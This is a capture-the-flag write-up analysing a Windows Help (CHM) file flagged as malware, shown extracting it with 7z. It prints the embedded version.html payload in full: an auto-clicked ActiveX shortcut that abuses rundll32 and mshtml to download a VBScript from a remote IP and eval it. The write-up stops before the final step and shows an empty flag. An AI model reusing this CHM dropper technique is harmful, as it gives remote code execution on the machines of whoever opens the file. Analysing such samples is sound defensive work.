### JS

> **Challenge Description:** Help me with this Windows Help file. Our anti-virus has detected this file as a malware. Seriously, it's just a Windows Help file. Analyze and find the flag.
>
> **Flag Format:** `ihack{MD5}`

### Solution

CHM files can be opened and extracted using `hh.exe` in Windows for legitimate use. In this case, extract all the components from the CHM file using `7z`.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/CHM]
â””â”€$ 7z e chm.chm 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10781 bytes (11 KiB)

Extracting archive: chm.chm
--
Path = chm.chm
Type = Chm
Physical Size = 10781

Would you like to replace the existing file:
  Path:     ./Property
  Size:     4 bytes (1 KiB)
  Modified: 2022-12-01 00:52:05
with the file from archive:
  Path:     $WWAssociativeLinks/Property
  Size:     4 bytes (1 KiB)
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? u

Everything is Ok                     

Folders: 2
Files: 12
Size:       11892
Compressed: 10781
```

The extracted `version.html` contains a embedded payload that references a `.vbs` file from a remote URL.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/CHM]
â””â”€$ cat version.html                                               
<body>
    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
        <PARAM name="Command" value="ShortCut">
        <PARAM name="Button" value="Bitmap::shortcut">
        <PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe > nul && %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://139.59.122.20/version.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'>
        <PARAM name="Item2" value="273,1,1">
      </OBJECT>
      <SCRIPT>
        x.Click();
      </SCRIPT> 
</body>
</html>  
```

Continue analyzing `version.vbs` and extract the flag from the `TXT` file.

**Flag:** `ihack{}`
